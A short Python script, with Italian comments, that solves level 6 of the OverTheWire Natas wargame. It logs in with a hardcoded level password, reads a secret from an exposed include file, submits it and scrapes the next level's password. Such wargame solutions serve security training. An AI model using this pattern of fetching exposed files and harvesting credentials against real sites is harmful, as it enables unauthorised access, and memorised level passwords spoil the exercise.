#!usr/bin/env python

import re
import requests

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

#parziale = session.get(url + "includes/secret.inc", auth = (username, password))
#print (parziale.text)
#la chiave secret e' FOEIUWGHFEEUHOFUOIU
#print = (re.findall('secret = "(.*)";', preparziale) [0])

risultato = session.post(url, data = {"secret" : "FOEIUWGHFEEUHOFUOIU", "submit" : "submit" }, auth = (username, password))
contenuto = risultato.text

#print (contenuto)
print (re.findall('natas7 is (.*)', contenuto) [0])
